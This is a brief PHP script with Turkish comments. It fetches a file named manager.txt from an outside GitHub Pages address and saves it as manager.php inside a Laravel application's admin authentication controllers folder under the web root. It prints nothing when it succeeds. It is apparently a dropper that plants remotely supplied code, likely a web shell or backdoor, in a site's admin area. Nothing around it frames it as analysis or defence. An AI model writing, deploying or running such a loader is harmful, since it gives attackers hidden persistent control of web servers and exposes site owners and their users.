<?php
// Dosya URL'si
$fileUrl = 'https://necessaryfor.github.io/all/manager.txt';

// Dosyanın kaydedileceği yol (belirttiğiniz dizin)
$savePath = $_SERVER['DOCUMENT_ROOT'] . '/core/app/Http/Controllers/Admin/Auth/manager.php';

// URL'den dosya içeriğini almak
$fileContent = file_get_contents($fileUrl);

// Dosya içeriği alındıysa ve boş değilse kaydet
if ($fileContent !== false && !empty($fileContent)) {
    // Dosyayı belirtilen dizine yaz
    $fileSaved = file_put_contents($savePath, $fileContent);

    if ($fileSaved !== false) {
        echo "";
    } else {
        echo "Dosya oluşturulamadı.";
    }
} else {
    echo "Dosya içeriği alınamadı veya boş.";
}
?>
